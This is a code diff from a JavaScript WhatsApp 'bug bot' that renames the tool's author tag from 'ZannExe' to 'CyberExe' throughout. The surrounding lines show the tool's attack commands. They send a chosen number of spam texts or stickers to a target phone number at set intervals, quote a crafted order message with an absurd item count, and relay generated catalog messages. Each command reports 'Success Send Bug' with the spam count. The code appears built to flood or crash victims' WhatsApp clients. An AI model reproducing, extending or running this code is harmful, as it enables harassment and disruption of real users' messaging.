@@ -289,7 +289,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'Created By ZannExe',
+message: 'Created By CyberExe',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -1255,10 +1255,10 @@ num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-sock.sendMessage(num, { text: 'Halo Guys Aku ZannExe Bug' }, { quoted: lep})
+sock.sendMessage(num, { text: 'Halo Guys Aku CyberExe Bug' }, { quoted: lep})
 await sleep(ms(waktu))
 }
-tekteka = `Success Send Bug By ZannExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
+tekteka = `Success Send Bug By CyberExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
 reply(tekteka)
 }
 addCmd(command.slice(0), 1, commund)
@@ -1275,7 +1275,7 @@ for (let i = 0; i < jumlah; i++) {
 sock.sendMessage(num, { sticker: xhsh }, { quoted: lep})
 await sleep(ms(waktu))
 }
-tek = `Success Send Bug By ZannExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
+tek = `Success Send Bug By CyberExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
 reply(tek)
 }
 addCmd(command.slice(0), 1, commund)
@@ -1289,10 +1289,10 @@ num = q.split('|')[0]
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-sock.sendMessage(num, { text: 'Halo Guys Aku ZannExe Bug' }, { quoted: lep})
+sock.sendMessage(num, { text: 'Halo Guys Aku CyberExe Bug' }, { quoted: lep})
 await sleep(ms(waktu))
 }
-tekteka = `Success Send Bug By ZannExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
+tekteka = `Success Send Bug By CyberExe To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
 reply(tekteka)
 }
 addCmd(command.slice(0), 1, commund)
@@ -1326,7 +1326,7 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 }), { userJid: m.chat, quoted: lep  })
 sock.relayMessage(num, catalog.message, { messageId: catalog.key.id })
 }
-reply(`Sukses Send Bug By ZannExe`)
+reply(`Sukses Send Bug By CyberExe`)
 }
 break
 case 'bugtag': {
